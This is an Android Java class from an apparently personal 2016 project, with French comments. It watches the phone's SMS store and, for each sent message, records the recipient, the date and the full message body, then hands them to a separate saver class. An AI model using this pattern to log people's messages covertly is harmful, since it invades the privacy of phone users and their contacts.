package com.example.ghazi.myapplication;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import java.util.Date;

/**
 * Created by ghazi on 15/07/2016.
 */
public class SmsObserver extends ContentObserver {

    private Context context = null;



    static final Uri SMS_STATUS_URI = Uri.parse("content://sms");




    public SmsObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;

    }


    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }


    @Override
    public void onChange(boolean selfChange) {



        Cursor smsCursor = context.getContentResolver().query(SMS_STATUS_URI,null,null,null,null);

        if(smsCursor != null){

           smsCursor.moveToNext();


               String protocol = smsCursor.getString(smsCursor.getColumnIndex("protocol"));


               if(protocol == null){


                   //les SMS envoyé

                   String resultSms = "";

                         resultSms += "SMS envoyé à : " + smsCursor.getString(smsCursor.getColumnIndex("address"))+"\n";


                   Date date = new Date(smsCursor.getLong(smsCursor.getColumnIndex("date")));
                   String chDate = date.getDate()+"/"+(date.getMonth()+1)+"/"+(date.getYear()+1900)+" à "+date.getHours()+":"+date.getMinutes()+":"+date.getSeconds();

                          resultSms += "Date d'envoie : " + chDate+"\n";

                          resultSms += "Message : " + smsCursor.getString(smsCursor.getColumnIndex("body"))+"\n";


                   SmsSaver smsSaver = new SmsSaver(context,resultSms);
                   smsSaver.saveSms();


               }







           }




    }




}
